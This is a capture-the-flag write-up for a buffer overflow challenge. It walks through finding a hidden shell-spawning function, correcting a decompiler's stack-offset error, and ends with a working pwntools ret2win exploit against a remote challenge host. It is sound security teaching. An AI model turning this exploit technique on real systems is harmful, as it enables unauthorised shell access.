### Challenge Description
```
RINg the Bell
Crownspire’s fire-watch has one bell pattern that clears a street faster than any order could: three short tolls, a pause, then two long ones… Rin has one chance to get past the lock, climb to the bell, and ring the toll exactly as she memorized it.
```

In short: classic stack buffer overflow → find the hidden `bell()` function that calls `execl("/bin/sh", "sh", NULL)` → calculate the correct offset to the return address → ret2win (with optional stack-alignment `ret`) → shell → flag.

### Tools & Environment
- Linux (Parrot / Ubuntu) + Ghidra (auto-analysis + decompiler)
- GDB (vanilla, no pwndbg/gef at the start)
- Python 3 + pwntools
- Starting point: only the `ring_the_bell` ELF binary (and a lot of screenshots)

### 1. Environment Setup & First Round of Pain

The challenge gives a single ELF and a long fantasy narrative about ringing a bell with a specific pattern. First instinct was the usual “open in Ghidra → look for interesting strings / win functions”.

The decompiled `main` looked almost too simple:

```c
undefined8 local_28, local_20, local_18, local_10;
...
read(0, &local_28, 0x60);   // 0x60 bytes into a tiny buffer
info("D-d-did they hear us..?");
return 0;
```

Obvious overflow. The story about “three short, two long” made us waste time looking for some tone-checking logic that never existed.

**Stupid mistakes / pitfalls #1:**
- Assuming the “pattern” in the story must be reflected as a hard-coded sequence or comparison in the binary
- Trusting Ghidra’s local-variable names (`local_28`) without checking the actual stack frame in the listing
- Spending time staring at the PLT `read` thunk instead of the real `main` logic

### 2. Locating the Real Win Condition

Scrolling up from `main` in the Listing view revealed a tiny function right above it:

```asm
bell:
  endbr64
  push   rbp
  mov    rbp, rsp
  mov    edx, 0
  lea    rax, [rip+…]      ; "sh"
  mov    rsi, rax
  lea    rax, [rip+…]      ; "/bin/sh"
  mov    rdi, rax
  mov    eax, 0
  call   execl
  ...
```

Ghidra’s decompiler cleaned it up to the perfect one-liner:

```c
void bell(void) {
    execl("/bin/sh", "sh", 0);
}
```

Address: `0x40176d`. Classic ret2win target. No need for ROP chains, no need for shellcode – just land on this function.

### 3. The Stack-Layout Nightmare

This is where we lost the most time.

Ghidra showed four `undefined8` locals starting at `local_28`, so the natural calculation was:

```
buffer @ rbp-0x28
saved rbp = 0x28 bytes
return address = 0x30
```

We wrote the payload with offset `0x30`, jumped to `0x40176d`, and both local and remote just died with SIGSEGV / EOF.

Then we tried jumping into the middle of `bell` (the `mov rdi, rax` instruction at `0x40178b`). That also crashed – because `rax` was never loaded with the address of `"/bin/sh"`.

**The truth only appeared after we forced a clean disassembly of `main`:**

```asm
0x4017a3  sub  $0x20, %rsp          ; only 0x20 bytes allocated!
0x4017f9  lea  -0x20(%rbp), %rax    ; buffer actually starts at rbp-0x20
...
0x401828  leave
0x401829  ret
```

Correct offset:

```
0x20 (buffer) + 8 (saved rbp) = 0x28
```

Ghidra’s variable naming had simply been wrong. The decompiler invented `local_28` while the real frame was only 0x20 bytes deep.

### 4. Stack Alignment & Final Payload

Even with the right offset, a naked jump to `bell` sometimes failed on the remote (modern libc + SSE alignment requirements). Adding a single `ret` gadget fixed it:

```python
from pwn import *

p = remote('154.57.164.75', 31665)

bell = 0x40176d
ret  = 0x40179a          # any ret gadget

payload  = b'A' * 0x28
payload += p64(ret)
payload += p64(bell)

p.sendafter(b'[Rin]: ', payload)
p.interactive()
```

Shell appeared. `ls` → `cat flag` → done.

### 5. Full Attack Chain Recap

1. Open ELF in Ghidra, notice the tiny `bell` function that calls `execl("/bin/sh", …)`
2. Confirm the overflow in `main` (`read(0, buf, 0x60)`)
3. Disassemble `main` properly → discover real frame size is `0x20`, not `0x28`
4. Offset = `0x28`
5. (Optional but recommended) insert a `ret` for alignment
6. Jump to `0x40176d`
7. Shell → flag

### 6. All the Stupid Things We Hit

| Problem | What happened | Fix |
|---------|---------------|-----|
| Trusted Ghidra’s `local_28` | Offset calculated as 0x30 → instant crash | Always cross-check with `disassemble main` / Listing |
| Jumped into the middle of `bell` | `rax` not set → segfault | Use the real function entry (`0x40176d`) |
| No pwndbg / gef | `pattern create` command unknown | Fell back to pure `disassemble` + manual math |
| Core files refused to appear | pwntools couldn’t find them | Abandoned cyclic, went straight to assembly |
| Stack alignment ignored | Remote kept giving EOF | Added a `ret` gadget before the win address |
| Expected a “tone pattern” check | Wasted time looking for comparisons | The story was pure flavour; the real check was just “did we reach `bell`?” |

### 7. Lessons Learned

1. **Never trust Ghidra’s local-variable offsets blindly.** The decompiler is helpful, but the Listing / raw disassembly is the source of truth for stack frames.
2. When a win function is only a few instructions long, jump to its *entry*, not to a random instruction inside it.
3. Modern environments often need an extra `ret` for 16-byte stack alignment before calling into libc.
4. A colourful story about “three short tolls and two long ones” does not mean the binary contains a sequence checker. Sometimes the narrative is just dressing.
5. When cyclic + core dumps fail you, a clean `disassemble main` is still the most reliable way to get the exact offset.
6. Beginner-friendly tooling (Ghidra + vanilla GDB + a 10-line pwntools script) is more than enough once the stack layout is understood.

### One-sentence path

ELF → Ghidra finds `bell()` (execl /bin/sh) → real stack frame is only 0x20 bytes → offset 0x28 → (optional ret) → jump to 0x40176d → shell → flag.